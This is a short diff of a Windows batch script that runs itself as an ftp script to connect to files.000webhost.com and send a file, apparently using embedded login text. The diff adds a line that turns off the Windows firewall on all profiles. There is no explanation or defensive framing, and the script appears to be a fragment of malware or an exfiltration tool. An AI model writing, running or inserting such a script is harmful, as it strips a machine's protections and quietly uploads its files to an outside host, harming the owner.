@@ -1,4 +1,5 @@
 echo Send file
+NetSh Advfirewall set allprofiles state off
 @ftp -i -s:"%~f0"&GOTO:EOF
 open files.000webhost.com
 unrated-circuitry
